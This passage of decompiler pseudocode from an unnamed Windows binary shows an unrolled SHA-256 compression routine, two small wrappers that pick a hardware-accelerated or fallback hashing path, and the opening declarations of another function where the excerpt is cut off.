  v5 = _mm_loadu_si128(a1 + 1);
  do
  {
    v181[1] = (__int128)v5;
    v181[0] = (__int128)v4;
    while ( 1 )
    {
      v3 -= 48;
      v197 = _byteswap_ulong(*a2);
      v196 = _byteswap_ulong(a2[1]);
      v195 = _byteswap_ulong(a2[2]);
      v194 = _byteswap_ulong(a2[3]);
      v193 = _byteswap_ulong(a2[4]);
      v192 = _byteswap_ulong(a2[5]);
      v191 = _byteswap_ulong(a2[6]);
      v190 = _byteswap_ulong(a2[7]);
      v189 = _byteswap_ulong(a2[8]);
      v188 = _byteswap_ulong(a2[9]);
      v187 = _byteswap_ulong(a2[10]);
      v186 = _byteswap_ulong(a2[11]);
      v185 = _byteswap_ulong(a2[12]);
      v184 = _byteswap_ulong(a2[13]);
      v183 = _byteswap_ulong(a2[14]);
      v182 = _byteswap_ulong(a2[15]);
      v6 = __ROR4__(v181[1], 6);
      v7 = (__ROR4__(v6, 5) ^ v6 ^ __ROR4__(v181[1], 25))
         + HIDWORD(v181[1])
         + v197
         + *v3
         + (DWORD2(v181[1]) ^ v181[1] & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
      v8 = __ROR4__(v181[0], 2);
      HIDWORD(v181[0]) += v7;
      HIDWORD(v181[1]) = (__ROR4__(v8, 11) ^ v8 ^ __ROR4__(v181[0], 22))
                       + v7
                       + (DWORD1(v181[0]) ^ (DWORD1(v181[0]) ^ LODWORD(v181[0])) & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
      v9 = __ROR4__(HIDWORD(v181[0]), 6);
      v10 = (__ROR4__(v9, 5) ^ v9 ^ __ROR4__(HIDWORD(v181[0]), 25))
          + DWORD2(v181[1])
          + v196
          + v3[1]
          + (DWORD1(v181[1]) ^ HIDWORD(v181[0]) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
      v11 = __ROR4__(HIDWORD(v181[1]), 2);
      DWORD2(v181[0]) += v10;
      DWORD2(v181[1]) = (__ROR4__(v11, 11) ^ v11 ^ __ROR4__(HIDWORD(v181[1]), 22))
                      + v10
                      + (LODWORD(v181[0]) ^ (LODWORD(v181[0]) ^ HIDWORD(v181[1])) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
      v12 = __ROR4__(DWORD2(v181[0]), 6);
      v13 = (__ROR4__(v12, 5) ^ v12 ^ __ROR4__(DWORD2(v181[0]), 25))
          + DWORD1(v181[1])
          + v195
          + v3[2]
          + (LODWORD(v181[1]) ^ DWORD2(v181[0]) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
      v14 = __ROR4__(DWORD2(v181[1]), 2);
      DWORD1(v181[0]) += v13;
      DWORD1(v181[1]) = (__ROR4__(v14, 11) ^ v14 ^ __ROR4__(DWORD2(v181[1]), 22))
                      + v13
                      + (HIDWORD(v181[1]) ^ (HIDWORD(v181[1]) ^ DWORD2(v181[1])) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
      v15 = __ROR4__(DWORD1(v181[0]), 6);
      v16 = (__ROR4__(v15, 5) ^ v15 ^ __ROR4__(DWORD1(v181[0]), 25))
          + LODWORD(v181[1])
          + v194
          + v3[3]
          + (HIDWORD(v181[0]) ^ DWORD1(v181[0]) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
      v17 = __ROR4__(DWORD1(v181[1]), 2);
      LODWORD(v181[0]) += v16;
      LODWORD(v181[1]) = (__ROR4__(v17, 11) ^ v17 ^ __ROR4__(DWORD1(v181[1]), 22))
                       + v16
                       + (DWORD2(v181[1]) ^ (DWORD2(v181[1]) ^ DWORD1(v181[1])) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
      v18 = __ROR4__(v181[0], 6);
      v19 = (__ROR4__(v18, 5) ^ v18 ^ __ROR4__(v181[0], 25))
          + HIDWORD(v181[0])
          + v193
          + v3[4]
          + (DWORD2(v181[0]) ^ v181[0] & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
      v20 = __ROR4__(v181[1], 2);
      HIDWORD(v181[1]) += v19;
      HIDWORD(v181[0]) = (__ROR4__(v20, 11) ^ v20 ^ __ROR4__(v181[1], 22))
                       + v19
                       + (DWORD1(v181[1]) ^ (DWORD1(v181[1]) ^ LODWORD(v181[1])) & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
      v21 = __ROR4__(HIDWORD(v181[1]), 6);
      v22 = (__ROR4__(v21, 5) ^ v21 ^ __ROR4__(HIDWORD(v181[1]), 25))
          + DWORD2(v181[0])
          + v192
          + v3[5]
          + (DWORD1(v181[0]) ^ HIDWORD(v181[1]) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
      v23 = __ROR4__(HIDWORD(v181[0]), 2);
      DWORD2(v181[1]) += v22;
      DWORD2(v181[0]) = (__ROR4__(v23, 11) ^ v23 ^ __ROR4__(HIDWORD(v181[0]), 22))
                      + v22
                      + (LODWORD(v181[1]) ^ (LODWORD(v181[1]) ^ HIDWORD(v181[0])) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
      v24 = __ROR4__(DWORD2(v181[1]), 6);
      v25 = (__ROR4__(v24, 5) ^ v24 ^ __ROR4__(DWORD2(v181[1]), 25))
          + DWORD1(v181[0])
          + v191
          + v3[6]
          + (LODWORD(v181[0]) ^ DWORD2(v181[1]) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
      v26 = __ROR4__(DWORD2(v181[0]), 2);
      DWORD1(v181[1]) += v25;
      DWORD1(v181[0]) = (__ROR4__(v26, 11) ^ v26 ^ __ROR4__(DWORD2(v181[0]), 22))
                      + v25
                      + (HIDWORD(v181[0]) ^ (HIDWORD(v181[0]) ^ DWORD2(v181[0])) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
      v27 = __ROR4__(DWORD1(v181[1]), 6);
      v28 = (__ROR4__(v27, 5) ^ v27 ^ __ROR4__(DWORD1(v181[1]), 25))
          + LODWORD(v181[0])
          + v190
          + v3[7]
          + (HIDWORD(v181[1]) ^ DWORD1(v181[1]) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
      v29 = __ROR4__(DWORD1(v181[0]), 2);
      LODWORD(v181[1]) += v28;
      LODWORD(v181[0]) = (__ROR4__(v29, 11) ^ v29 ^ __ROR4__(DWORD1(v181[0]), 22))
                       + v28
                       + (DWORD2(v181[0]) ^ (DWORD2(v181[0]) ^ DWORD1(v181[0])) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
      v30 = __ROR4__(v181[1], 6);
      v31 = (__ROR4__(v30, 5) ^ v30 ^ __ROR4__(v181[1], 25))
          + HIDWORD(v181[1])
          + v189
          + v3[8]
          + (DWORD2(v181[1]) ^ v181[1] & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
      v32 = __ROR4__(v181[0], 2);
      HIDWORD(v181[0]) += v31;
      HIDWORD(v181[1]) = (__ROR4__(v32, 11) ^ v32 ^ __ROR4__(v181[0], 22))
                       + v31
                       + (DWORD1(v181[0]) ^ (DWORD1(v181[0]) ^ LODWORD(v181[0])) & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
      v33 = __ROR4__(HIDWORD(v181[0]), 6);
      v34 = (__ROR4__(v33, 5) ^ v33 ^ __ROR4__(HIDWORD(v181[0]), 25))
          + DWORD2(v181[1])
          + v188
          + v3[9]
          + (DWORD1(v181[1]) ^ HIDWORD(v181[0]) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
      v35 = __ROR4__(HIDWORD(v181[1]), 2);
      DWORD2(v181[0]) += v34;
      DWORD2(v181[1]) = (__ROR4__(v35, 11) ^ v35 ^ __ROR4__(HIDWORD(v181[1]), 22))
                      + v34
                      + (LODWORD(v181[0]) ^ (LODWORD(v181[0]) ^ HIDWORD(v181[1])) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
      v36 = __ROR4__(DWORD2(v181[0]), 6);
      v37 = (__ROR4__(v36, 5) ^ v36 ^ __ROR4__(DWORD2(v181[0]), 25))
          + DWORD1(v181[1])
          + v187
          + v3[10]
          + (LODWORD(v181[1]) ^ DWORD2(v181[0]) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
      v38 = __ROR4__(DWORD2(v181[1]), 2);
      DWORD1(v181[0]) += v37;
      DWORD1(v181[1]) = (__ROR4__(v38, 11) ^ v38 ^ __ROR4__(DWORD2(v181[1]), 22))
                      + v37
                      + (HIDWORD(v181[1]) ^ (HIDWORD(v181[1]) ^ DWORD2(v181[1])) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
      v39 = __ROR4__(DWORD1(v181[0]), 6);
      v40 = (__ROR4__(v39, 5) ^ v39 ^ __ROR4__(DWORD1(v181[0]), 25))
          + LODWORD(v181[1])
          + v186
          + v3[11]
          + (HIDWORD(v181[0]) ^ DWORD1(v181[0]) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
      v41 = __ROR4__(DWORD1(v181[1]), 2);
      LODWORD(v181[0]) += v40;
      LODWORD(v181[1]) = (__ROR4__(v41, 11) ^ v41 ^ __ROR4__(DWORD1(v181[1]), 22))
                       + v40
                       + (DWORD2(v181[1]) ^ (DWORD2(v181[1]) ^ DWORD1(v181[1])) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
      v42 = __ROR4__(v181[0], 6);
      v43 = (__ROR4__(v42, 5) ^ v42 ^ __ROR4__(v181[0], 25))
          + HIDWORD(v181[0])
          + v185
          + v3[12]
          + (DWORD2(v181[0]) ^ v181[0] & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
      v44 = __ROR4__(v181[1], 2);
      HIDWORD(v181[1]) += v43;
      HIDWORD(v181[0]) = (__ROR4__(v44, 11) ^ v44 ^ __ROR4__(v181[1], 22))
                       + v43
                       + (DWORD1(v181[1]) ^ (DWORD1(v181[1]) ^ LODWORD(v181[1])) & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
      v45 = __ROR4__(HIDWORD(v181[1]), 6);
      v46 = (__ROR4__(v45, 5) ^ v45 ^ __ROR4__(HIDWORD(v181[1]), 25))
          + DWORD2(v181[0])
          + v184
          + v3[13]
          + (DWORD1(v181[0]) ^ HIDWORD(v181[1]) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
      v47 = __ROR4__(HIDWORD(v181[0]), 2);
      DWORD2(v181[1]) += v46;
      DWORD2(v181[0]) = (__ROR4__(v47, 11) ^ v47 ^ __ROR4__(HIDWORD(v181[0]), 22))
                      + v46
                      + (LODWORD(v181[1]) ^ (LODWORD(v181[1]) ^ HIDWORD(v181[0])) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
      v48 = __ROR4__(DWORD2(v181[1]), 6);
      v49 = (__ROR4__(v48, 5) ^ v48 ^ __ROR4__(DWORD2(v181[1]), 25))
          + DWORD1(v181[0])
          + v183
          + v3[14]
          + (LODWORD(v181[0]) ^ DWORD2(v181[1]) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
      v50 = __ROR4__(DWORD2(v181[0]), 2);
      DWORD1(v181[1]) += v49;
      DWORD1(v181[0]) = (__ROR4__(v50, 11) ^ v50 ^ __ROR4__(DWORD2(v181[0]), 22))
                      + v49
                      + (HIDWORD(v181[0]) ^ (HIDWORD(v181[0]) ^ DWORD2(v181[0])) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
      v51 = __ROR4__(DWORD1(v181[1]), 6);
      v52 = (__ROR4__(v51, 5) ^ v51 ^ __ROR4__(DWORD1(v181[1]), 25))
          + LODWORD(v181[0])
          + v182
          + v3[15]
          + (HIDWORD(v181[1]) ^ DWORD1(v181[1]) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
      result = DWORD2(v181[0]) ^ DWORD1(v181[0]);
      v54 = __ROR4__(DWORD1(v181[0]), 2);
      v55 = v52 + (DWORD2(v181[0]) ^ (DWORD2(v181[0]) ^ DWORD1(v181[0])) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
      v56 = LODWORD(v181[1]) + v52;
      LODWORD(v181[1]) = v56;
      v57 = (__ROR4__(v54, 11) ^ v54 ^ __ROR4__(DWORD1(v181[0]), 22)) + v55;
      LODWORD(v181[0]) = v57;
      do
      {
        v3 += 16;
        v58 = DWORD2(v181[1]) ^ v56 & (DWORD2(v181[1]) ^ DWORD1(v181[1]));
        v59 = v56;
        v60 = __ROR4__(v56, 6);
        v61 = (__ROR4__(v60, 5) ^ v60 ^ __ROR4__(v59, 25)) + v58;
        v62 = __ROR4__(v183, 17);
        v63 = __ROR4__(v196, 7);
        v64 = HIDWORD(v181[1]) + *v3 + v61;
        v197 += v188 + (v62 ^ (v183 >> 10) ^ __ROR4__(v62, 2)) + (__ROR4__(v63, 11) ^ v63 ^ (v196 >> 3));
        v65 = v197 + v64;
        v66 = v57;
        v67 = DWORD1(v181[0]) ^ v57;
        v68 = v66;
        v69 = __ROR4__(v66, 2);
        HIDWORD(v181[0]) += v65;
        HIDWORD(v181[1]) = (__ROR4__(v69, 11) ^ v69 ^ __ROR4__(v68, 22)) + v65 + (DWORD1(v181[0]) ^ v67 & result);
        v70 = __ROR4__(HIDWORD(v181[0]), 6);
        v71 = (__ROR4__(v70, 5) ^ v70 ^ __ROR4__(HIDWORD(v181[0]), 25))
            + (DWORD1(v181[1]) ^ HIDWORD(v181[0]) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
        v72 = __ROR4__(v182, 17);
        v73 = __ROR4__(v195, 7);
        v74 = DWORD2(v181[1]) + v3[1] + v71;
        v196 += v187 + (v72 ^ (v182 >> 10) ^ __ROR4__(v72, 2)) + (__ROR4__(v73, 11) ^ v73 ^ (v195 >> 3));
        v75 = v196 + v74;
        v76 = __ROR4__(HIDWORD(v181[1]), 2);
        DWORD2(v181[0]) += v75;
        DWORD2(v181[1]) = (__ROR4__(v76, 11) ^ v76 ^ __ROR4__(HIDWORD(v181[1]), 22))
                        + v75
                        + (LODWORD(v181[0]) ^ (LODWORD(v181[0]) ^ HIDWORD(v181[1])) & v67);
        v77 = __ROR4__(DWORD2(v181[0]), 6);
        v78 = (__ROR4__(v77, 5) ^ v77 ^ __ROR4__(DWORD2(v181[0]), 25))
            + (LODWORD(v181[1]) ^ DWORD2(v181[0]) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
        v79 = __ROR4__(v197, 17);
        v80 = __ROR4__(v194, 7);
        v81 = DWORD1(v181[1]) + v3[2] + v78;
        v195 += v186 + (v79 ^ (v197 >> 10) ^ __ROR4__(v79, 2)) + (__ROR4__(v80, 11) ^ v80 ^ (v194 >> 3));
        v82 = v195 + v81;
        v83 = __ROR4__(DWORD2(v181[1]), 2);
        DWORD1(v181[0]) += v82;
        DWORD1(v181[1]) = (__ROR4__(v83, 11) ^ v83 ^ __ROR4__(DWORD2(v181[1]), 22))
                        + v82
                        + (HIDWORD(v181[1]) ^ (HIDWORD(v181[1]) ^ DWORD2(v181[1])) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
        v84 = __ROR4__(DWORD1(v181[0]), 6);
        v85 = (__ROR4__(v84, 5) ^ v84 ^ __ROR4__(DWORD1(v181[0]), 25))
            + (HIDWORD(v181[0]) ^ DWORD1(v181[0]) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
        v86 = __ROR4__(v196, 17);
        v87 = __ROR4__(v193, 7);
        v88 = LODWORD(v181[1]) + v3[3] + v85;
        v194 += v185 + (v86 ^ (v196 >> 10) ^ __ROR4__(v86, 2)) + (__ROR4__(v87, 11) ^ v87 ^ (v193 >> 3));
        v89 = v194 + v88;
        v90 = __ROR4__(DWORD1(v181[1]), 2);
        LODWORD(v181[0]) += v89;
        LODWORD(v181[1]) = (__ROR4__(v90, 11) ^ v90 ^ __ROR4__(DWORD1(v181[1]), 22))
                         + v89
                         + (DWORD2(v181[1]) ^ (DWORD2(v181[1]) ^ DWORD1(v181[1])) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
        v91 = __ROR4__(v181[0], 6);
        v92 = (__ROR4__(v91, 5) ^ v91 ^ __ROR4__(v181[0], 25))
            + (DWORD2(v181[0]) ^ v181[0] & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
        v93 = __ROR4__(v195, 17);
        v94 = __ROR4__(v192, 7);
        v95 = HIDWORD(v181[0]) + v3[4] + v92;
        v193 += v184 + (v93 ^ (v195 >> 10) ^ __ROR4__(v93, 2)) + (__ROR4__(v94, 11) ^ v94 ^ (v192 >> 3));
        v96 = v193 + v95;
        v97 = __ROR4__(v181[1], 2);
        HIDWORD(v181[1]) += v96;
        HIDWORD(v181[0]) = (__ROR4__(v97, 11) ^ v97 ^ __ROR4__(v181[1], 22))
                         + v96
                         + (DWORD1(v181[1]) ^ (DWORD1(v181[1]) ^ LODWORD(v181[1])) & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
        v98 = __ROR4__(HIDWORD(v181[1]), 6);
        v99 = (__ROR4__(v98, 5) ^ v98 ^ __ROR4__(HIDWORD(v181[1]), 25))
            + (DWORD1(v181[0]) ^ HIDWORD(v181[1]) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
        v100 = __ROR4__(v194, 17);
        v101 = __ROR4__(v191, 7);
        v102 = DWORD2(v181[0]) + v3[5] + v99;
        v192 += v183 + (v100 ^ (v194 >> 10) ^ __ROR4__(v100, 2)) + (__ROR4__(v101, 11) ^ v101 ^ (v191 >> 3));
        v103 = v192 + v102;
        v104 = __ROR4__(HIDWORD(v181[0]), 2);
        DWORD2(v181[1]) += v103;
        DWORD2(v181[0]) = (__ROR4__(v104, 11) ^ v104 ^ __ROR4__(HIDWORD(v181[0]), 22))
                        + v103
                        + (LODWORD(v181[1]) ^ (LODWORD(v181[1]) ^ HIDWORD(v181[0])) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
        v105 = __ROR4__(DWORD2(v181[1]), 6);
        v106 = (__ROR4__(v105, 5) ^ v105 ^ __ROR4__(DWORD2(v181[1]), 25))
             + (LODWORD(v181[0]) ^ DWORD2(v181[1]) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
        v107 = __ROR4__(v193, 17);
        v108 = __ROR4__(v190, 7);
        v109 = DWORD1(v181[0]) + v3[6] + v106;
        v191 += v182 + (v107 ^ (v193 >> 10) ^ __ROR4__(v107, 2)) + (__ROR4__(v108, 11) ^ v108 ^ (v190 >> 3));
        v110 = v191 + v109;
        v111 = __ROR4__(DWORD2(v181[0]), 2);
        DWORD1(v181[1]) += v110;
        DWORD1(v181[0]) = (__ROR4__(v111, 11) ^ v111 ^ __ROR4__(DWORD2(v181[0]), 22))
                        + v110
                        + (HIDWORD(v181[0]) ^ (HIDWORD(v181[0]) ^ DWORD2(v181[0])) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
        v112 = __ROR4__(DWORD1(v181[1]), 6);
        v113 = (__ROR4__(v112, 5) ^ v112 ^ __ROR4__(DWORD1(v181[1]), 25))
             + (HIDWORD(v181[1]) ^ DWORD1(v181[1]) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
        v114 = __ROR4__(v192, 17);
        v115 = __ROR4__(v189, 7);
        v116 = LODWORD(v181[0]) + v3[7] + v113;
        v190 += v197 + (v114 ^ (v192 >> 10) ^ __ROR4__(v114, 2)) + (__ROR4__(v115, 11) ^ v115 ^ (v189 >> 3));
        v117 = v190 + v116;
        v118 = __ROR4__(DWORD1(v181[0]), 2);
        LODWORD(v181[1]) += v117;
        LODWORD(v181[0]) = (__ROR4__(v118, 11) ^ v118 ^ __ROR4__(DWORD1(v181[0]), 22))
                         + v117
                         + (DWORD2(v181[0]) ^ (DWORD2(v181[0]) ^ DWORD1(v181[0])) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
        v119 = __ROR4__(v181[1], 6);
        v120 = (__ROR4__(v119, 5) ^ v119 ^ __ROR4__(v181[1], 25))
             + (DWORD2(v181[1]) ^ v181[1] & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
        v121 = __ROR4__(v191, 17);
        v122 = __ROR4__(v188, 7);
        v123 = HIDWORD(v181[1]) + v3[8] + v120;
        v189 += v196 + (v121 ^ (v191 >> 10) ^ __ROR4__(v121, 2)) + (__ROR4__(v122, 11) ^ v122 ^ (v188 >> 3));
        v124 = v189 + v123;
        v125 = __ROR4__(v181[0], 2);
        HIDWORD(v181[0]) += v124;
        HIDWORD(v181[1]) = (__ROR4__(v125, 11) ^ v125 ^ __ROR4__(v181[0], 22))
                         + v124
                         + (DWORD1(v181[0]) ^ (DWORD1(v181[0]) ^ LODWORD(v181[0])) & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
        v126 = __ROR4__(HIDWORD(v181[0]), 6);
        v127 = (__ROR4__(v126, 5) ^ v126 ^ __ROR4__(HIDWORD(v181[0]), 25))
             + (DWORD1(v181[1]) ^ HIDWORD(v181[0]) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
        v128 = __ROR4__(v190, 17);
        v129 = __ROR4__(v187, 7);
        v130 = DWORD2(v181[1]) + v3[9] + v127;
        v188 += v195 + (v128 ^ (v190 >> 10) ^ __ROR4__(v128, 2)) + (__ROR4__(v129, 11) ^ v129 ^ (v187 >> 3));
        v131 = v188 + v130;
        v132 = __ROR4__(HIDWORD(v181[1]), 2);
        DWORD2(v181[0]) += v131;
        DWORD2(v181[1]) = (__ROR4__(v132, 11) ^ v132 ^ __ROR4__(HIDWORD(v181[1]), 22))
                        + v131
                        + (LODWORD(v181[0]) ^ (LODWORD(v181[0]) ^ HIDWORD(v181[1])) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
        v133 = __ROR4__(DWORD2(v181[0]), 6);
        v134 = (__ROR4__(v133, 5) ^ v133 ^ __ROR4__(DWORD2(v181[0]), 25))
             + (LODWORD(v181[1]) ^ DWORD2(v181[0]) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
        v135 = __ROR4__(v189, 17);
        v136 = __ROR4__(v186, 7);
        v137 = DWORD1(v181[1]) + v3[10] + v134;
        v187 += v194 + (v135 ^ (v189 >> 10) ^ __ROR4__(v135, 2)) + (__ROR4__(v136, 11) ^ v136 ^ (v186 >> 3));
        v138 = v187 + v137;
        v139 = __ROR4__(DWORD2(v181[1]), 2);
        DWORD1(v181[0]) += v138;
        DWORD1(v181[1]) = (__ROR4__(v139, 11) ^ v139 ^ __ROR4__(DWORD2(v181[1]), 22))
                        + v138
                        + (HIDWORD(v181[1]) ^ (HIDWORD(v181[1]) ^ DWORD2(v181[1])) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
        v140 = __ROR4__(DWORD1(v181[0]), 6);
        v141 = (__ROR4__(v140, 5) ^ v140 ^ __ROR4__(DWORD1(v181[0]), 25))
             + (HIDWORD(v181[0]) ^ DWORD1(v181[0]) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
        v142 = __ROR4__(v188, 17);
        v143 = __ROR4__(v185, 7);
        v144 = LODWORD(v181[1]) + v3[11] + v141;
        v186 += v193 + (v142 ^ (v188 >> 10) ^ __ROR4__(v142, 2)) + (__ROR4__(v143, 11) ^ v143 ^ (v185 >> 3));
        v145 = v186 + v144;
        v146 = __ROR4__(DWORD1(v181[1]), 2);
        LODWORD(v181[0]) += v145;
        LODWORD(v181[1]) = (__ROR4__(v146, 11) ^ v146 ^ __ROR4__(DWORD1(v181[1]), 22))
                         + v145
                         + (DWORD2(v181[1]) ^ (DWORD2(v181[1]) ^ DWORD1(v181[1])) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
        v147 = __ROR4__(v181[0], 6);
        v148 = (__ROR4__(v147, 5) ^ v147 ^ __ROR4__(v181[0], 25))
             + (DWORD2(v181[0]) ^ v181[0] & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
        v149 = __ROR4__(v187, 17);
        v150 = __ROR4__(v184, 7);
        v151 = HIDWORD(v181[0]) + v3[12] + v148;
        v185 += v192 + (v149 ^ (v187 >> 10) ^ __ROR4__(v149, 2)) + (__ROR4__(v150, 11) ^ v150 ^ (v184 >> 3));
        v152 = v185 + v151;
        v153 = __ROR4__(v181[1], 2);
        HIDWORD(v181[1]) += v152;
        HIDWORD(v181[0]) = (__ROR4__(v153, 11) ^ v153 ^ __ROR4__(v181[1], 22))
                         + v152
                         + (DWORD1(v181[1]) ^ (DWORD1(v181[1]) ^ LODWORD(v181[1])) & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
        v154 = __ROR4__(HIDWORD(v181[1]), 6);
        v155 = (__ROR4__(v154, 5) ^ v154 ^ __ROR4__(HIDWORD(v181[1]), 25))
             + (DWORD1(v181[0]) ^ HIDWORD(v181[1]) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
        v156 = __ROR4__(v186, 17);
        v157 = __ROR4__(v183, 7);
        v158 = DWORD2(v181[0]) + v3[13] + v155;
        v184 += v191 + (v156 ^ (v186 >> 10) ^ __ROR4__(v156, 2)) + (__ROR4__(v157, 11) ^ v157 ^ (v183 >> 3));
        v159 = v184 + v158;
        v160 = __ROR4__(HIDWORD(v181[0]), 2);
        DWORD2(v181[1]) += v159;
        DWORD2(v181[0]) = (__ROR4__(v160, 11) ^ v160 ^ __ROR4__(HIDWORD(v181[0]), 22))
                        + v159
                        + (LODWORD(v181[1]) ^ (LODWORD(v181[1]) ^ HIDWORD(v181[0])) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
        v161 = __ROR4__(DWORD2(v181[1]), 6);
        v162 = (__ROR4__(v161, 5) ^ v161 ^ __ROR4__(DWORD2(v181[1]), 25))
             + (LODWORD(v181[0]) ^ DWORD2(v181[1]) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
        v163 = __ROR4__(v185, 17);
        v164 = __ROR4__(v182, 7);
        v165 = DWORD1(v181[0]) + v3[14] + v162;
        v183 += v190 + (v163 ^ (v185 >> 10) ^ __ROR4__(v163, 2)) + (__ROR4__(v164, 11) ^ v164 ^ (v182 >> 3));
        v166 = v183 + v165;
        v167 = __ROR4__(DWORD2(v181[0]), 2);
        DWORD1(v181[1]) += v166;
        DWORD1(v181[0]) = (__ROR4__(v167, 11) ^ v167 ^ __ROR4__(DWORD2(v181[0]), 22))
                        + v166
                        + (HIDWORD(v181[0]) ^ (HIDWORD(v181[0]) ^ DWORD2(v181[0])) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
        v168 = __ROR4__(DWORD1(v181[1]), 6);
        v169 = (__ROR4__(v168, 5) ^ v168 ^ __ROR4__(DWORD1(v181[1]), 25))
             + (HIDWORD(v181[1]) ^ DWORD1(v181[1]) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
        v170 = __ROR4__(v184, 17);
        v171 = __ROR4__(v197, 7);
        v172 = LODWORD(v181[0]) + v3[15] + v169;
        v182 += v189 + (v170 ^ (v184 >> 10) ^ __ROR4__(v170, 2)) + (__ROR4__(v171, 11) ^ v171 ^ (v197 >> 3));
        v173 = v182 + v172;
        result = DWORD2(v181[0]) ^ DWORD1(v181[0]);
        v174 = __ROR4__(DWORD1(v181[0]), 2);
        v175 = v173 + (DWORD2(v181[0]) ^ (DWORD2(v181[0]) ^ DWORD1(v181[0])) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
        v56 = LODWORD(v181[1]) + v173;
        LODWORD(v181[1]) = v56;
        v57 = (__ROR4__(v174, 11) ^ v174 ^ __ROR4__(DWORD1(v181[0]), 22)) + v175;
        LODWORD(v181[0]) = v57;
      }
      while ( (unsigned int)v3 < v198 );
      a2 = v200 + 16;
      v176 = v199;
      v200 += 16;
      if ( (v198 & 1) != 0 )
        break;
      v199->m128i_i32[0] += v57;
      v176[1].m128i_i32[0] += v56;
      v177 = HIDWORD(v181[0]);
      v178 = DWORD2(v181[0]);
      v176->m128i_i32[1] += DWORD1(v181[0]);
      v176->m128i_i32[2] += v178;
      v176->m128i_i32[3] += v177;
      v179 = DWORD2(v181[1]);
      result = DWORD1(v181[1]);
      v180 = HIDWORD(v181[1]);
      v176[1].m128i_i32[1] += DWORD1(v181[1]);
      v176[1].m128i_i32[2] += v179;
      v176[1].m128i_i32[3] += v180;
      a1 = v176;
      if ( (unsigned int)a2 >= v201 )
        return result;
LABEL_3:
      qmemcpy(v181, a1, sizeof(v181));
      v3 = (_DWORD *)v198;
    }
    v5 = _mm_add_epi32(_mm_loadu_si128(v199 + 1), (__m128i)v181[1]);
    v4 = _mm_add_epi32(_mm_loadu_si128(v199), (__m128i)v181[0]);
    v199[1] = v5;
    *v176 = v4;
  }
  while ( (unsigned int)a2 < v201 );
  return result;
}

//----- (00423C52) --------------------------------------------------------
__m128i *__cdecl sub_423C52(int *a1, int *a2)
{
  if ( sub_420DE5() )
    return sub_428E46((__m128i *)a1, (__m128i *)a2, 0x40u, 0);
  else
    return (__m128i *)sub_420F84(a1, a2);
}

//----- (00423C75) --------------------------------------------------------
__m128i *__cdecl sub_423C75(_DWORD *a1, unsigned int *a2)
{
  __m128i *v2; // eax

  LOBYTE(v2) = sub_420DE5();
  if ( (_BYTE)v2 )
    return sub_4290DD(v2, (__m128i *)a1, (__m128i *)a2, 0x40u, 0);
  else
    return (__m128i *)sub_421FFE(a1, a2);
}
// 423C8A: variable 'v2' is possibly undefined

//----- (00423C98) --------------------------------------------------------
int __thiscall sub_423C98(void *this, char *a2, char *a3, int a4)
{
  int result; // eax
  _BYTE **v5; // eax
  _BYTE **v6; // eax
  _BYTE **v7; // eax
  _DWORD *v8; // eax
  char v9[24]; // [esp+10h] [ebp-98h] BYREF
  char v10[24]; // [esp+28h] [ebp-80h] BYREF
  char v11[24]; // [esp+40h] [ebp-68h] BYREF
  char v12[24]; // [esp+58h] [ebp-50h] BYREF
  int pExceptionObject[13]; // [esp+70h] [ebp-38h] BYREF
  int v14; // [esp+A4h] [ebp-4h]

